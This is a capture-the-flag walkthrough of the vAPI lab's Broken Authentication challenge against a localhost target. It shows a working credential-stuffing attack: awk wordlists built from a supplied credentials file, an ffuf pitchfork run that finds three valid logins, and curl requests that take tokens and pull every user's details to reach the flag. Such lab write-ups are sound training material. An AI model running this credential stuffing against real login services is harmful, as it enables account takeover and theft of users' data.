# Broken Authentication
> We don't seem to have credentials for this , How do we login? (There's something in the Resources Folder given to you )

# Tools Used:
```
GNU Awk 5.2.1
ffuf 2.1.0-dev
curl 8.8.0 (x86_64-pc-linux-gnu)
grep (GNU grep) 3.11
```

# User Login
## POST /vapi/api2/user/login

Create a emails.txt wordlist from the credential list provided.
```bash
awk -F"," '{print $1}' /home/kali/Desktop/labs/vapi/Resources/API2_CredentialStuffing/creds.csv > ~/Desktop/emails.txt
```

Create a pass.txt wordlist from the credential list provided.
```bash
awk -F"," '{print $2}' /home/kali/Desktop/labs/vapi/Resources/API2_CredentialStuffing/creds.csv > ~/Desktop/pass.txt
```

Pitchfork the credentials provided with FuFF.
```bash
ffuf -w /home/kali/Desktop/emails.txt:FUZZ1 -w /home/kali/Desktop/pass.txt:FUZZ2 -X POST -H "Content-Type: application/json" -d '{"email": "FUZZ1", "password": "FUZZ2"}' -u http://localhost/vapi/api2/user/login -fc 401 -mode pitchfork -v
```
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/vapi/api2/user/login
 :: Wordlist         : FUZZ1: /home/kali/Desktop/emails.txt
 :: Wordlist         : FUZZ2: /home/kali/Desktop/pass.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"email": "FUZZ1", "password": "FUZZ2"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 2208ms]
| URL | http://localhost/vapi/api2/user/login
    * FUZZ1: savanna48@ortiz.com
    * FUZZ2: zTyBwV/9

[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 2187ms]
| URL | http://localhost/vapi/api2/user/login
    * FUZZ1: hauck.aletha@yahoo.com
    * FUZZ2: kU-wDE7r

[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 2207ms]
| URL | http://localhost/vapi/api2/user/login
    * FUZZ1: harber.leif@beatty.info
    * FUZZ2: kU-wDE7r

:: Progress: [1000/1000] :: Job [1/1] :: 18 req/sec :: Duration: [0:00:55] :: Errors: 0 ::
```

Use any of the correct credentials to get a JSON response containing the Token.
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost' -H $'Content-Type: application/json' \
    --data-binary $'{\x0d\x0a\"email\": \"savanna48@ortiz.com\",\x0d\x0a\"password\": \"zTyBwV/9\"\x0d\x0a}' \
    $'http://localhost/vapi/api2/user/login'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 20:09:12 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 20:09:12 GMT
Content-Type: application/json

{"success":"true","token":"Fp0r1mty_gxK9DRZ5IUw3sX2enQ6rau68M6YGyoqR3XoBG13wtSbvmdaK5CB"}
```

```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost' -H $'Content-Type: application/json' \
    --data-binary $'{\x0d\x0a\"email\": \"hauck.aletha@yahoo.com\",\x0d\x0a\"password\": \"kU-wDE7r\"\x0d\x0a}' \
    $'http://localhost/vapi/api2/user/login'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 20:10:12 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 20:10:12 GMT
Content-Type: application/json

{"success":"true","token":"1Nkoz6quzJiis1SEonJeSxwkXTzSzcULofbL9O7KPz6_sKGkUcQDzoNfI5aA"}
```

```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost' -H $'Content-Type: application/json' \
    --data-binary $'{\x0d\x0a\"email\": \"harber.leif@beatty.info\",\x0d\x0a\"password\": \"kU-wDE7r\"\x0d\x0a}' \
    $'http://localhost/vapi/api2/user/login'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 20:10:51 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 20:10:51 GMT
Content-Type: application/json

{"success":"true","token":"sLqs17RjmdlWoBP2ONdAPP8WtIVNwlyz_qzLwhmJGboWD_asFICYggcE3bPi"}
```


As specified in the Postman Collection, the test script to be executed for the API2 User Login endpoint is used to derive the Token (Authorization-Token) by parsing the JSON, selecting the value of "token" key and updates it in the Postman Environment as api2_auth.
```js
var jsonData = JSON.parse(responseBody);
var api2_auth = jsonData.token;
console.log("API 2 Auth : "+api2_auth);
postman.setEnvironmentVariable("api2_auth",api2_auth);
```

We can manually derive the Authorization Token (Authorization-Token) of our fuzzed user(s) manually from the response(s):
```
Fp0r1mty_gxK9DRZ5IUw3sX2enQ6rau68M6YGyoqR3XoBG13wtSbvmdaK5CB
```
```
1Nkoz6quzJiis1SEonJeSxwkXTzSzcULofbL9O7KPz6_sKGkUcQDzoNfI5aA
```
```
sLqs17RjmdlWoBP2ONdAPP8WtIVNwlyz_qzLwhmJGboWD_asFICYggcE3bPi
```
- We will need any one of these Authorization Tokens for the "Get Details" endpoint

Get the Cross Site Request Forgery Token (XSRF-TOKEN)
```bash
curl -c - http://127.0.0.1/vapi/ -v --silent 2>&1 | grep -shoP '(?<=Set-Cookie: XSRF-TOKEN=).*?(?=;)'
```
```
eyJpdiI6IjRPYjBYbDh1aHNzMlpuZVpsQ0NkbXc9PSIsInZhbHVlIjoiNTBwRjJrWExlYkJjVFdRcEZ5NEQ5OCtoUFVnMCtvYk1hdE5OR0NBSXlJeWhuWG9jR2l4MWJJcGVxcTdWandUSGs3S21KU1dQcWZQUWZnZlZDWVBXYkpzV041anVHUk1EUHdtRUVBM21ETHd4OGxoS3A3YU1DdDNtRmxteElsbDQiLCJtYWMiOiI5ZWU2ZmI2Y2YwMzVkYjI1YzlhMzQ2MjYwMTA5NDg2MTFmOTJiNjI2NDljYzE0ZGQ1OGE1ZjRmZWE2YjM5MzdkIiwidGFnIjoiIn0%3D
```
- We will need this Cross Site Request Forgery Token for the "Get Details" endpoint

# Get Details
## GET /vapi/api2/user/details

Use any of the authorization token with the XSRF token to get the flag
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -b $'XSRF-TOKEN=eyJpdiI6InVRcmlodGE0ZTJGdk0yT1o0cDIxZGc9PSIsInZhbHVlIjoiZGdBVEh0VG9sTzhVZnBpaml5ckFOaXQrT2krVTNNYlZvMHJtdmUyZGM1KzBaSG5VdVRhK3YwU3M2VGc4MzEvM2xubHY5WXkwRG53SWNwUi90eWVLWkJNeXpjMGVCbkhFMGxCV01FSjJzM050TElOd3FFSkoyVzVvYTdnT2dTM2MiLCJtYWMiOiJjNzBlN2IxODEyMzA4OTNiODI0ZTRiYWMzMzMxN2ZlZTRmYzliNTQ1ODRlZTM3NTE2NDYwN2RmZTBiMzJiYWU1IiwidGFnIjoiIn0%3D' \
    -H $'Authorization-Token: Fp0r1mty_gxK9DRZ5IUw3sX2enQ6rau68M6YGyoqR3XoBG13wtSbvmdaK5CB' \
    $'http://localhost/vapi/api2/user/details'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 20:27:30 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 20:27:30 GMT
Content-Type: application/json

[{"id":1,"email":"savanna48@ortiz.com","name":"Evelyn","token":"Fp0r1mty_gxK9DRZ5IUw3sX2enQ6rau68M6YGyoqR3XoBG13wtSbvmdaK5CB","address":"10th Downing","city":"Mesport","country":"USA"},{"id":2,"email":"hauck.aletha@yahoo.com","name":"Tara","token":"1Nkoz6quzJiis1SEonJeSxwkXTzSzcULofbL9O7KPz6_sKGkUcQDzoNfI5aA","address":"flag{api2_6bf2beda61e2a1ab2d0a}","city":"Delhi","country":"India"},{"id":3,"email":"harber.leif@beatty.info","name":"Joyce","token":"sLqs17RjmdlWoBP2ONdAPP8WtIVNwlyz_qzLwhmJGboWD_asFICYggcE3bPi","address":"San Jose","city":"California","country":"USA"}]
```

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -b $'XSRF-TOKEN=eyJpdiI6InVRcmlodGE0ZTJGdk0yT1o0cDIxZGc9PSIsInZhbHVlIjoiZGdBVEh0VG9sTzhVZnBpaml5ckFOaXQrT2krVTNNYlZvMHJtdmUyZGM1KzBaSG5VdVRhK3YwU3M2VGc4MzEvM2xubHY5WXkwRG53SWNwUi90eWVLWkJNeXpjMGVCbkhFMGxCV01FSjJzM050TElOd3FFSkoyVzVvYTdnT2dTM2MiLCJtYWMiOiJjNzBlN2IxODEyMzA4OTNiODI0ZTRiYWMzMzMxN2ZlZTRmYzliNTQ1ODRlZTM3NTE2NDYwN2RmZTBiMzJiYWU1IiwidGFnIjoiIn0%3D' \
    -H $'Authorization-Token: 1Nkoz6quzJiis1SEonJeSxwkXTzSzcULofbL9O7KPz6_sKGkUcQDzoNfI5aA' \
    $'http://localhost/vapi/api2/user/details'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 20:27:57 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 20:27:57 GMT
Content-Type: application/json

[{"id":1,"email":"savanna48@ortiz.com","name":"Evelyn","token":"Fp0r1mty_gxK9DRZ5IUw3sX2enQ6rau68M6YGyoqR3XoBG13wtSbvmdaK5CB","address":"10th Downing","city":"Mesport","country":"USA"},{"id":2,"email":"hauck.aletha@yahoo.com","name":"Tara","token":"1Nkoz6quzJiis1SEonJeSxwkXTzSzcULofbL9O7KPz6_sKGkUcQDzoNfI5aA","address":"flag{api2_6bf2beda61e2a1ab2d0a}","city":"Delhi","country":"India"},{"id":3,"email":"harber.leif@beatty.info","name":"Joyce","token":"sLqs17RjmdlWoBP2ONdAPP8WtIVNwlyz_qzLwhmJGboWD_asFICYggcE3bPi","address":"San Jose","city":"California","country":"USA"}]
```

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -b $'XSRF-TOKEN=eyJpdiI6InVRcmlodGE0ZTJGdk0yT1o0cDIxZGc9PSIsInZhbHVlIjoiZGdBVEh0VG9sTzhVZnBpaml5ckFOaXQrT2krVTNNYlZvMHJtdmUyZGM1KzBaSG5VdVRhK3YwU3M2VGc4MzEvM2xubHY5WXkwRG53SWNwUi90eWVLWkJNeXpjMGVCbkhFMGxCV01FSjJzM050TElOd3FFSkoyVzVvYTdnT2dTM2MiLCJtYWMiOiJjNzBlN2IxODEyMzA4OTNiODI0ZTRiYWMzMzMxN2ZlZTRmYzliNTQ1ODRlZTM3NTE2NDYwN2RmZTBiMzJiYWU1IiwidGFnIjoiIn0%3D' \
    -H $'Authorization-Token: sLqs17RjmdlWoBP2ONdAPP8WtIVNwlyz_qzLwhmJGboWD_asFICYggcE3bPi' \
    $'http://localhost/vapi/api2/user/details'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 20:28:30 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 20:28:30 GMT
Content-Type: application/json

[{"id":1,"email":"savanna48@ortiz.com","name":"Evelyn","token":"Fp0r1mty_gxK9DRZ5IUw3sX2enQ6rau68M6YGyoqR3XoBG13wtSbvmdaK5CB","address":"10th Downing","city":"Mesport","country":"USA"},{"id":2,"email":"hauck.aletha@yahoo.com","name":"Tara","token":"1Nkoz6quzJiis1SEonJeSxwkXTzSzcULofbL9O7KPz6_sKGkUcQDzoNfI5aA","address":"flag{api2_6bf2beda61e2a1ab2d0a}","city":"Delhi","country":"India"},{"id":3,"email":"harber.leif@beatty.info","name":"Joyce","token":"sLqs17RjmdlWoBP2ONdAPP8WtIVNwlyz_qzLwhmJGboWD_asFICYggcE3bPi","address":"San Jose","city":"California","country":"USA"}]
```

API2 Flag
```
flag{api2_6bf2beda61e2a1ab2d0a}
```

References:
https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/
https://owasp.org/API-Security/editions/2019/en/0xa2-broken-user-authentication/
